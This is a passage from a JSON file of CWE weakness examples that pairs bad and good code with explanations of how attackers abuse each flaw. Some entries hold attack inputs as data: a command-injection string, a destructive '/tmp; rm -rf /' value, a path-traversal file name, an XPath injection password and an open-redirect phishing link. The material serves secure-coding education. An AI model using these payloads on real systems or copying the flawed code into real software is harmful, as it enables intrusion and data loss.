        "demonstrative_examples": "Example 1 In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent. (bad code) Example Language: Java String str1 = new String(\"Hello\"); String str2 = new String(\"Hello\"); if (str1 == str2) { System.out.println(\"str1 == str2\"); } However, the if statement will not be executed as the strings are compared using the \"==\" operator. For Java objects, such as String objects, the \"==\" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method: (good code) if (str1.equals(str2)) { System.out.println(\"str1 equals str2\"); } Example 2 In the following Java example, two BankAccount objects are compared in the isSameAccount method using the == operator. (bad code) Example Language: Java public boolean isSameAccount(BankAccount accountA, BankAccount accountB) { return accountA == accountB; } Using the == operator to compare objects may produce incorrect or deceptive results by comparing object references rather than values. The equals() method should be used to ensure correct results or objects should contain a member variable that uniquely identifies the object. The following example shows the use of the equals() method to compare the BankAccount objects and the next example uses a class get method to retrieve the bank account number that uniquely identifies the BankAccount object to compare the objects. (good code) Example Language: Java public boolean isSameAccount(BankAccount accountA, BankAccount accountB) { return accountA.equals(accountB); }"
    },
    {
        "id": 597,
        "demonstrative_examples": "Example 1 In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent. (bad code) Example Language: Java String str1 = new String(\"Hello\"); String str2 = new String(\"Hello\"); if (str1 == str2) { System.out.println(\"str1 == str2\"); } However, the if statement will not be executed as the strings are compared using the \"==\" operator. For Java objects, such as String objects, the \"==\" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method: (good code) if (str1.equals(str2)) { System.out.println(\"str1 equals str2\"); } Example 2 In the example below, three JavaScript variables are declared and initialized with the same values. Note that JavaScript will change a value between numeric and string as needed, which is the reason an integer is included with the strings. An if statement is used to determine whether the values are the same. (bad code) Example Language: JavaScript <p id=\"ieq3s1\" type=\"text\">(i === s1) is FALSE</p> <p id=\"s4eq3i\" type=\"text\">(s4 === i) is FALSE</p> <p id=\"s4eq3s1\" type=\"text\">(s4 === s1) is FALSE</p> var i = 65; \"var s1 = '65';\" \"var s4 = new String('65');\" if (i === s1) { document.getElementById(\"ieq3s1\").innerHTML = \"(i === s1) is TRUE\"; } if (s4 === i) { document.getElementById(\"s4eq3i\").innerHTML = \"(s4 === i) is TRUE\"; } if (s4 === s1) { document.getElementById(\"s4eq3s1\").innerHTML = \"(s4 === s1) is TRUE\"; } However, the body of the if statement will not be executed, as the \"===\" compares both the type of the variable AND the value. As the types of the first comparison are number and string, it fails. The types in the second are int and reference, so this one fails as well. The types in the third are reference and string, so it also fails. While the variables above contain the same values, they are contained in different types, so the document.getElementById... statement will not be executed in any of the cases. To compare object values, the previous code is modified and shown below to use the \"==\" for value comparison so the comparison in this example executes the HTML statement: (good code) Example Language: JavaScript <p id=\"ieq2s1\" type=\"text\">(i == s1) is FALSE</p> <p id=\"s4eq2i\" type=\"text\">(s4 == i) is FALSE</p> <p id=\"s4eq2s1\" type=\"text\">(s4 == s1) is FALSE</p> var i = 65; \"var s1 = '65';\" \"var s4 = new String('65');\" if (i == s1) { document.getElementById(\"ieq2s1\").innerHTML = \"(i == s1) is TRUE\"; } if (s4 == i) { document.getElementById(\"s4eq2i\").innerHTML = \"(s4 == i) is TRUE\"; } if (s4 == s1) { document.getElementById(\"s4eq2s1\").innerHTML = \"(s4 == s1) is TRUE\"; } Example 3 In the example below, two PHP variables are declared and initialized with the same numbers - one as a string, the other as an integer. Note that PHP will change the string value to a number for a comparison. An if statement is used to determine whether the values are the same. (bad code) Example Language: PHP var $i = 65; var $s1 = \"65\"; if ($i === $s1) { echo \\'($i === $s1) is TRUE\\'. \"\\\\n\"; } else { echo \\'($i === $s1) is FALSE\\'. \"\\\\n\"; } However, the body of the if statement will not be executed, as the \"===\" compares both the type of the variable AND the value. As the types of the first comparison are number and string, it fails. While the variables above contain the same values, they are contained in different types, so the TRUE portion of the if statement will not be executed. To compare object values, the previous code is modified and shown below to use the \"==\" for value comparison (string converted to number) so the comparison in this example executes the TRUE statement: (good code) Example Language: PHP var $i = 65; var $s1 = \"65\"; if ($i == $s1) { echo \\'($i == $s1) is TRUE\\'. \"\\\\n\"; } else { echo \\'($i == $s1) is FALSE\\'. \"\\\\n\"; }"
    },
    {
        "id": 598,
        "demonstrative_examples": ""
    },
    {
        "id": 599,
        "demonstrative_examples": "Example 1 The following OpenSSL code ensures that the host has a certificate. (bad code) Example Language: C if (cert = SSL_get_peer_certificate(ssl)) { // got certificate, host can be trusted //foo=SSL_get_verify_result(ssl); //if (X509_V_OK==foo) ... } Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate."
    },
    {
        "id": 600,
        "demonstrative_examples": "Example 1 The following example attempts to resolve a hostname. (bad code) Example Language: Java protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { String ip = req.getRemoteAddr(); InetAddress addr = InetAddress.getByName(ip); ... out.println(\"hello \" + addr.getHostName()); } A DNS lookup failure will cause the Servlet to throw an exception."
    },
    {
        "id": 601,
        "demonstrative_examples": "Example 1 The following code obtains a URL from the query string and then redirects the user to that URL. (bad code) Example Language: PHP \"$redirect_url = $_GET['url'];\" header(\"Location: \" . $redirect_url); The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link: (attack code) http://example.com/example.php?url=http://malicious.example.com The user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place. Example 2 The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address. (bad code) Example Language: Java public class RedirectServlet extends HttpServlet { protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String query = request.getQueryString(); if (query.contains(\"url\")) { String url = request.getParameter(\"url\"); response.sendRedirect(url); } } } The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of a e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link: (attack code) Example Language: HTML <a href=\"http://bank.example.com/redirect?url=http://attacker.example.net\">Click here to log in</a> \"The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.\""
    },
    {
        "id": 602,
        "demonstrative_examples": "Example 1 This example contains client-side code that checks if the user authenticated successfully before sending a command. The server-side code performs the authentication in one step, and executes the command in a separate step. CLIENT-SIDE (client.pl) (good code) Example Language: Perl $server = \"server.example.com\"; $username = AskForUserName(); $password = AskForPassword(); $address = AskForAddress(); $sock = OpenSocket($server, 1234); writeSocket($sock, \"AUTH $username $password\\\\n\"); $resp = readSocket($sock); if ($resp eq \"success\") { # username/pass is valid, go ahead and update the info! writeSocket($sock, \"CHANGE-ADDRESS $username $address\\\\n\"; } else { print \"ERROR: Invalid Authentication!\\\\n\"; } SERVER-SIDE (server.pl): (bad code) $sock = acceptSocket(1234); ($cmd, $args) = ParseClientRequest($sock); if ($cmd eq \"AUTH\") { ($username, $pass) = split(/\\\\s+/, $args, 2); $result = AuthenticateUser($username, $pass); writeSocket($sock, \"$result\\\\n\"); # does not close the socket on failure; assumes the # user will try again } elsif ($cmd eq \"CHANGE-ADDRESS\") { if (validateAddress($args)) { $res = UpdateDatabaseRecord($username, \"address\", $args); writeSocket($sock, \"SUCCESS\\\\n\"); } else { writeSocket($sock, \"FAILURE -- address is malformed\\\\n\"); } } The server accepts 2 commands, \"AUTH\" which authenticates the user, and \"CHANGE-ADDRESS\" which updates the address field for the username. The client performs the authentication and only sends a CHANGE-ADDRESS for that user if the authentication succeeds. Because the client has already performed the authentication, the server assumes that the username in the CHANGE-ADDRESS is the same as the authenticated user. An attacker could modify the client by removing the code that sends the \"AUTH\" command and simply executing the CHANGE-ADDRESS."
    },
    {
        "id": 603,
        "demonstrative_examples": ""
    },
    {
        "id": 605,
        "demonstrative_examples": "Example 1 This code binds a server socket to port 21, allowing the server to listen for traffic on that port. (bad code) Example Language: C void bind_socket(void) { int server_sockfd; int server_len; struct sockaddr_in server_address; /*unlink the socket if already bound to avoid an error when bind() is called*/ unlink(\"server_socket\"); server_sockfd = socket(AF_INET, SOCK_STREAM, 0); server_address.sin_family = AF_INET; server_address.sin_port = 21; server_address.sin_addr.s_addr = htonl(INADDR_ANY); server_len = sizeof(struct sockaddr_in); bind(server_sockfd, (struct sockaddr *) &s1, server_len); } \"This code may result in two servers binding a socket to same port, thus receiving each other's traffic. This could be used by an attacker to steal packets meant for another process, such as a secure FTP server.\""
    },
    {
        "id": 606,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C void iterate(int n){ int i; for (i = 0; i < n; i++){ foo(); } } void iterateFoo() { unsigned int num; scanf(\"%u\",&num); iterate(num); } Example 2 In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing. (bad code) Example Language: C int processMessageFromSocket(int socket) { int success; char buffer[BUFFER_SIZE]; char message[MESSAGE_SIZE]; // get message from socket and store into buffer //Ignoring possibliity that buffer > BUFFER_SIZE if (getMessage(socket, buffer, BUFFER_SIZE) > 0) { // place contents of the buffer into message structure ExMessage *msg = recastBuffer(buffer); // copy message body into string for processing int index; for (index = 0; index < msg->msgLength; index++) { message[index] = msg->msgBody[index]; } \"message[index] = '\\\\0';\" // process message success = processMessage(message); } return success; } However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body ( CWE-606 ). This can result in a buffer over-read ( CWE-125 ) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body ( CWE-130 )."
    },
    {
        "id": 607,
        "demonstrative_examples": "Example 1 Here, an array (which is inherently mutable) is labeled public static final. (bad code) Example Language: Java public static final String[] USER_ROLES;"
    },
    {
        "id": 608,
        "demonstrative_examples": "Example 1 In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for a online business site. The user will enter registration data and through the Struts framework the RegistrationForm bean will maintain the user data. (bad code) Example Language: Java public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // variables for registration form public String name; public String email; ... public RegistrationForm() { super(); } public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...} ... } However, within the RegistrationForm the member variables for the registration form input data are declared public not private. All member variables within a Struts framework ActionForm class must be declared private to prevent the member variables from being modified without using the getter and setter methods. The following example shows the member variables being declared private and getter and setter methods declared for accessing the member variables. (good code) Example Language: Java public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...} // getter and setter methods for private variables ... }"
    },
    {
        "id": 609,
        "demonstrative_examples": "Example 1 It may seem that the following bit of code achieves thread safety while avoiding unnecessary synchronization... (bad code) Example Language: Java if (helper == null) { synchronized (this) { if (helper == null) { helper = new Helper(); } } } return helper; The programmer wants to guarantee that only one Helper() object is ever allocated, but does not want to pay the cost of synchronization every time this code is called. Suppose that helper is not initialized. Then, thread A sees that helper==null and enters the synchronized block and begins to execute: (bad code) helper = new Helper(); If a second thread, thread B, takes over in the middle of this call and helper has not finished running the constructor, then thread B may make calls on helper while its fields hold incorrect values."
    },
    {
        "id": 610,
        "demonstrative_examples": ""
    },
    {
        "id": 611,
        "demonstrative_examples": ""
    },
    {
        "id": 612,
        "demonstrative_examples": ""
    },
    {
        "id": 613,
        "demonstrative_examples": "Example 1 The following snippet was taken from a J2EE web.xml deployment descriptor in which the session-timeout parameter is explicitly defined (the default value depends on the container). In this case the value is set to -1, which means that a session will never expire. (bad code) Example Language: Java <web-app> [...snipped...] <session-config> <session-timeout>-1</session-timeout> </session-config> </web-app>"
    },
    {
        "id": 614,
        "demonstrative_examples": "Example 1 The snippet of code below, taken from a servlet doPost() method, sets an accountID cookie (sensitive) without calling setSecure(true). (bad code) Example Language: Java Cookie c = new Cookie(ACCOUNT_ID, acctID); response.addCookie(c);"
    },
    {
        "id": 615,
        "demonstrative_examples": "Example 1 The following comment, embedded in a JSP, will be displayed in the resulting HTML output. (bad code) Example Language: JSP <!-- FIXME: calling this with more than 30 args kills the JDBC server -->"
    },
    {
        "id": 616,
        "demonstrative_examples": "Example 1 As of 2006, the \"four globals\" method is probably in sharp decline, but older PHP applications could have this issue. In the \"four globals\" method, PHP sets the following 4 global variables (where \"varname\" is application-dependent): (bad code) Example Language: PHP $varname = name of the temporary file on local machine $varname_size = size of file $varname_name = original name of file provided by client $varname_type = MIME type of the file Example 2 \"The global $_FILES exists as of PHP 4.1.0 (Use $HTTP_POST_FILES instead if using an earlier version). These arrays will contain all the uploaded file information.\" (bad code) Example Language: PHP \"$_FILES['userfile']['name'] - original filename from client\" \"$_FILES['userfile']['tmp_name'] - the temp filename of the file on the server\" \"** note: 'userfile' is the field name from the web form; this can vary.\""
    },
    {
        "id": 617,
        "demonstrative_examples": "Example 1 \"In the excerpt below, an AssertionError (an unchecked exception) is thrown if the user hasn't entered an email address in an HTML form.\" (bad code) Example Language: Java String email = request.getParameter(\"email_address\"); assert email != null;"
    },
    {
        "id": 618,
        "demonstrative_examples": ""
    },
    {
        "id": 619,
        "demonstrative_examples": ""
    },
    {
        "id": 620,
        "demonstrative_examples": "Example 1 \"This code changes a user's password.\" (bad code) Example Language: PHP \"$user = $_GET['user'];\" \"$pass = $_GET['pass'];\" \"$checkpass = $_GET['checkpass'];\" if ($pass == $checkpass) { SetUserPassword($user, $pass); } \"While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.\""
    },
    {
        "id": 621,
        "demonstrative_examples": "Example 1 This code uses the credentials sent in a POST request to login a user. (bad code) Example Language: PHP //Log user in, and set $isAdmin to true if user is an administrator function login($user,$pass){ $query = buildQuery($user,$pass); mysql_query($query); if(getUserRole($user) == \"Admin\"){ $isAdmin = true; } } $isAdmin = false; extract($_POST); login(mysql_real_escape_string($user),mysql_real_escape_string($pass)); The call to extract() will overwrite the existing values of any variables defined previously, in this case $isAdmin. An attacker can send a POST request with an unexpected third value \"isAdmin\" equal to \"true\", thus gaining Admin privileges."
    },
    {
        "id": 622,
        "demonstrative_examples": ""
    },
    {
        "id": 623,
        "demonstrative_examples": ""
    },
    {
        "id": 624,
        "demonstrative_examples": ""
    },
    {
        "id": 625,
        "demonstrative_examples": "Example 1 The following code takes phone numbers as input, and uses a regular expression to reject invalid phone numbers. (bad code) Example Language: Perl $phone = GetPhoneNumber(); if ($phone =~ /\\\\d+-\\\\d+/) { # looks like it only has hyphens and digits system(\"lookup-phone $phone\"); } else { error(\"malformed number!\"); } An attacker could provide an argument such as: \"; ls -l ; echo 123-456\" This would pass the check, since \"123-456\" is sufficient to match the \"\\\\d+-\\\\d+\" portion of the regular expression."
    },
    {
        "id": 626,
        "demonstrative_examples": ""
    },
    {
        "id": 627,
        "demonstrative_examples": ""
    },
    {
        "id": 628,
        "demonstrative_examples": "Example 1 The following PHP method authenticates a user given a username/password combination but is called with the parameters in reverse order. (bad code) Example Language: PHP function authenticate($username, $password) { // authenticate user ... } \"authenticate($_POST['password'], $_POST['username']);\" Example 2 This Perl code intends to record whether a user authenticated successfully or not, and to exit if the user fails to authenticate. However, when it calls ReportAuth(), the third argument is specified as 0 instead of 1, so it does not exit. (bad code) Example Language: Perl sub ReportAuth { my ($username, $result, $fatal) = @_; PrintLog(\"auth: username=%s, result=%d\", $username, $result); if (($result ne \"success\") && $fatal) { die \"Failed!\\\\n\"; } } sub PrivilegedFunc { my $result = CheckAuth($username); ReportAuth($username, $result, 0); DoReallyImportantStuff(); } Example 3 In the following Java snippet, the accessGranted() method is accidentally called with the static ADMIN_ROLES array rather than the user roles. (bad code) Example Language: Java private static final String[] ADMIN_ROLES = ...; public boolean void accessGranted(String resource, String user) { String[] userRoles = getUserRoles(user); return accessGranted(resource, ADMIN_ROLES); } private boolean void accessGranted(String resource, String[] userRoles) { // grant or deny access based on user roles ... }"
    },
    {
        "id": 636,
        "demonstrative_examples": "Example 1 Switches may revert their functionality to that of hubs when the table used to map ARP information to the switch interface overflows, such as when under a spoofing attack. This results in traffic being broadcast to an eavesdropper, instead of being sent only on the relevant switch interface. To mitigate this type of problem, the developer could limit the number of ARP entries that can be recorded for a given switch interface, while other interfaces may keep functioning normally. Configuration options can be provided on the appropriate actions to be taken in case of a detected failure, but safe defaults should be used."
    },
    {
        "id": 637,
        "demonstrative_examples": "Example 1 The IPSEC specification is complex, which resulted in bugs, partial implementations, and incompatibilities between vendors. Example 2 HTTP Request Smuggling ( CWE-444 ) attacks are feasible because there are not stringent requirements for how illegal or inconsistent HTTP headers should be handled. This can lead to inconsistent implementations in which a proxy or firewall interprets the same data stream as a different set of requests than the end points in that stream."
    },
    {
        "id": 638,
        "demonstrative_examples": "Example 1 When executable library files are used on web servers, which is common in PHP applications, the developer might perform an access check in any user-facing executable, and omit the access check from the library file itself. By directly requesting the library file ( CWE-425 ), an attacker can bypass this access check. Example 2 When a developer begins to implement input validation for a web application, often the validation is performed in each area of the code that uses externally-controlled input. In complex applications with many inputs, the developer often misses a parameter here or a cookie there. One frequently-applied solution is to centralize all input validation, store these validated inputs in a separate data structure, and require that all access of those inputs must be through that data structure. An alternate approach would be to use an external input validation framework such as Struts, which performs the validation before the inputs are ever processed by the code."
    },
    {
        "id": 639,
        "demonstrative_examples": ""
    },
    {
        "id": 640,
        "demonstrative_examples": "Example 1 \"A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.\""
    },
    {
        "id": 641,
        "demonstrative_examples": ""
    },
    {
        "id": 642,
        "demonstrative_examples": "Example 1 In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data. (bad code) Example Language: Java Cookie[] cookies = request.getCookies(); for (int i =0; i< cookies.length; i++) { Cookie c = cookies[i]; if (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) { authenticated = true; } } Example 2 The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files ( CWE-22 ). (bad code) Example Language: Java String rName = request.getParameter(\"reportName\"); File rFile = new File(\"/usr/local/apfr/reports/\" + rName); ... rFile.delete(); Example 3 The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt. (bad code) Example Language: Java fis = new FileInputStream(cfg.getProperty(\"sub\")+\".txt\"); amt = fis.read(arr); out.println(arr); Example 4 This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system. (bad code) Example Language: C #define DIR \"/restricted/directory\" char cmd[500]; sprintf(cmd, \"ls -l %480s\", DIR); /* Raise privileges to those needed for accessing DIR. */ RaisePrivileges(...); system(cmd); DropPrivileges(...); ... \"This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.\" However, because the program does not modify the PATH environment variable, the following attack would work: (attack code) The user sets the PATH to reference a directory under the attacker\\'s control, such as \"/my/dir/\". The attacker creates a malicious program called \"ls\", and puts that program in /my/dir The user executes the program. When system() is executed, the shell consults the PATH to find the ls program The program finds the attacker\\'s malicious program, \"/my/dir/ls\". It doesn\\'t find \"/bin/ls\" because PATH does not contain \"/bin/\". \"The program executes the attacker's malicious program with the raised privileges.\" Example 5 The following code segment implements a basic server that uses the \"ls\" program to perform a directory listing of the directory that is listed in the \"HOMEDIR\" environment variable. The code intends to allow the user to specify an alternate \"LANG\" environment variable. This causes \"ls\" to customize its output based on a given language, which is an important capability when supporting internationalization. (bad code) Example Language: Perl $ENV{\"HOMEDIR\"} = \"/home/mydir/public/\"; my $stream = AcceptUntrustedInputStream(); while (<$stream>) { chomp; if (/^ENV ([\\\\w\\\\_]+) (.*)/) { $ENV{$1} = $2; } elsif (/^QUIT/) { ... } elsif (/^LIST/) { open($fh, \"/bin/ls -l $ENV{HOMEDIR}|\"); while (<$fh>) { SendOutput($stream, \"FILEINFO: $_\"); } close($fh); } } The programmer takes care to call a specific \"ls\" program and sets the HOMEDIR to a fixed value. However, an attacker can use a command such as \"ENV HOMEDIR /secret/directory\" to specify an alternate directory, enabling a path traversal attack ( CWE-22 ). At the same time, other attacks are enabled as well, such as OS command injection ( CWE-78 ) by setting HOMEDIR to a value such as \"/tmp; rm -rf /\". In this case, the programmer never intends for HOMEDIR to be modified, so input validation for HOMEDIR is not the solution. A partial solution would be an allowlist that only allows the LANG variable to be specified in the ENV command. Alternately, assuming this is an authenticated user, the language could be stored in a local file so that no ENV command at all would be needed. While this example may not appear realistic, this type of problem shows up in code fairly frequently. See CVE-1999-0073 in the observed examples for a real-world example with similar behaviors."
    },
    {
        "id": 643,
        "demonstrative_examples": "Example 1 Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information: (informative) Example Language: XML <users> <user> <login>john</login> <password>abracadabra</password> <home_dir>/home/john</home_dir> </user> <user> <login>cbc</login> <password>1mgr8</password> <home_dir>/home/cbc</home_dir> </user> </users> The Java code used to retrieve the home directory based on the provided credentials is: (bad code) Example Language: Java XPath xpath = XPathFactory.newInstance().newXPath(); XPathExpression xlogin = xpath.compile(\"//users/user[login/text()=\\'\" + login.getUserName() + \"\\' and password/text() = \\'\" + login.getPassword() + \"\\']/home_dir/text()\"); Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(\"db.xml\")); String homedir = xlogin.evaluate(d); Assume that user \"john\" wishes to leverage XPath Injection and login without a valid password. By providing a username \"john\" and password \"\\' or \\'\\'=\\'\" the XPath expression now becomes (attack code) \"//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()\" which, of course, lets user \"john\" login without a valid password, thus bypassing authentication."
    },
    {
        "id": 644,
        "demonstrative_examples": "Example 1 In the following Java example, user-controlled data is added to the HTTP headers and returned to the client. Given that the data is not subject to neutralization, a malicious user may be able to inject dangerous scripting tags that will lead to script execution in the client browser. (bad code) Example Language: Java response.addHeader(HEADER_NAME, untrustedRawInputData);"
    },
    {
        "id": 645,
        "demonstrative_examples": "Example 1 \"A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.\""
    },
    {
        "id": 646,
        "demonstrative_examples": ""
    },
    {
        "id": 647,
        "demonstrative_examples": "Example 1 Example from CAPEC (CAPEC ID: 4, \"Using Alternative IP Address Encodings\"). An attacker identifies an application server that applies a security policy based on the domain and application name, so the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by putting in the IP address of the host the application authentication and authorization controls may be bypassed http://192.168.0.1:8080/application. The attacker relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions."
    },
    {
        "id": 648,
        "demonstrative_examples": ""
    },
    {
        "id": 649,
        "demonstrative_examples": ""
    },
    {
        "id": 650,
        "demonstrative_examples": ""
    },
    {
        "id": 651,
        "demonstrative_examples": "Example 1 The WSDL for a service providing information on the best price of a certain item exposes the following method: float getBestPrice(String ItemID) An attacker might guess that there is a method setBestPrice (String ItemID, float Price) that is available and invoke that method to try and change the best price of a given item to their advantage. The attack may succeed if the attacker correctly guesses the name of the method, the method does not have proper access controls around it and the service itself has the functionality to update the best price of the item."
    },
    {
        "id": 652,
        "demonstrative_examples": "Example 1 \"An attacker may pass XQuery expressions embedded in an otherwise standard XML document. The attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back. doc(accounts.xml)//user[name='*'] The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL.\""
    },
    {
        "id": 653,
        "demonstrative_examples": "Example 1 \"Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains.\" Example 2 The traditional UNIX privilege model provides root with arbitrary access to all resources, but root is frequently the only user that has privileges. As a result, administrative tasks require root privileges, even if those tasks are limited to a small area, such as updating user manpages. Some UNIX flavors have a \"bin\" user that is the owner of system executables, but since root relies on executables owned by bin, a compromise of the bin account can be leveraged for root privileges by modifying a bin-owned executable, such as CVE-2007-4238."
    },
    {
        "id": 654,
        "demonstrative_examples": "Example 1 \"Password-only authentication is perhaps the most well-known example of use of a single factor. Anybody who knows a user's password can impersonate that user.\" Example 2 When authenticating, use multiple factors, such as \"something you know\" (such as a password) and \"something you have\" (such as a hardware-based one-time password generator, or a biometric device)."
    },
    {
        "id": 655,
        "demonstrative_examples": "Example 1 In \"Usability of Security: A Case Study\" [ REF-540 ], the authors consider human factors in a cryptography product. Some of the weakness relevant discoveries of this case study were: users accidentally leaked sensitive information, could not figure out how to perform some tasks, thought they were enabling a security option when they were not, and made improper trust decisions. Example 2 \"Enforcing complex and difficult-to-remember passwords that need to be frequently changed for access to trivial resources, e.g., to use a black-and-white printer. Complex password requirements can also cause users to store the passwords in an unsafe manner so they don't have to remember them, such as using a sticky note or saving them in an unencrypted file.\" Example 3 Some CAPTCHA utilities produce images that are too difficult for a human to read, causing user frustration."
    },
    {
        "id": 656,
        "demonstrative_examples": "Example 1 The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077. If ISNs can be guessed (due to predictability, CWE-330 ) or sniffed (due to lack of encryption, CWE-311 ), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328. Example 1 References: [REF-542] Jon Postel, Editor. \"RFC: 793, TRANSMISSION CONTROL PROTOCOL\". Information Sciences Institute. 1981-09. \\n\\t\\t\\t\\t< http://www.ietf.org/rfc/rfc0793.txt >."
    },
    {
        "id": 657,
        "demonstrative_examples": ""
    },
    {
        "id": 662,
        "demonstrative_examples": ""
    },
    {
        "id": 663,
        "demonstrative_examples": ""
    },
    {
        "id": 664,
        "demonstrative_examples": ""
    },
    {
        "id": 665,
        "demonstrative_examples": "Example 1 Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached. (bad code) Example Language: Java private boolean initialized = true; public void someMethod() { if (!initialized) { // perform initialization tasks ... initialized = true; } Example 2 The following code intends to limit certain operations to the administrator only. (bad code) Example Language: Perl $username = GetCurrentUser(); $state = GetStateData($username); if (defined($state)) { $uid = ExtractUserID($state); } # do stuff if ($uid == 0) { DoAdminThings(); } If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident. Example 3 The following code intends to concatenate a string to a variable and print the string. (bad code) Example Language: C char str[20]; strcat(str, \"hello world\"); printf(\"%s\", str); This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory. If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244 ). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found. \"If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (\" CWE-126 \") if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash.\""
    },
    {
        "id": 666,
        "demonstrative_examples": ""
    },
    {
        "id": 667,
        "demonstrative_examples": "Example 1 In the following Java snippet, methods are defined to get and set a long field in an instance of a class that is shared across multiple threads. Because operations on double and long are nonatomic in Java, concurrent access may cause unexpected behavior. Thus, all operations on long and double fields should be synchronized. (bad code) Example Language: Java private long someLongValue; public long getLongValue() { return someLongValue; } public void setLongValue(long l) { someLongValue = l; } Example 2 This code tries to obtain a lock for a file, then writes to it. (bad code) Example Language: PHP function writeToLog($message){ $logfile = fopen(\"logFile.log\", \"a\"); //attempt to get logfile lock if (flock($logfile, LOCK_EX)) { fwrite($logfile,$message); // unlock logfile flock($logfile, LOCK_UN); } else { print \"Could not obtain lock on logFile.log, message not recorded\\\\n\"; } } fclose($logFile); PHP by default will wait indefinitely until a file lock is released. If an attacker is able to obtain the file lock, this code will pause execution, possibly leading to denial of service for other users. Note that in this case, if an attacker can perform an flock() on the file, they may already have privileges to destroy the log file. However, this still impacts the execution of other programs that depend on flock(). Example 3 The following function attempts to acquire a lock in order to perform operations on a shared resource. (bad code) Example Language: C void 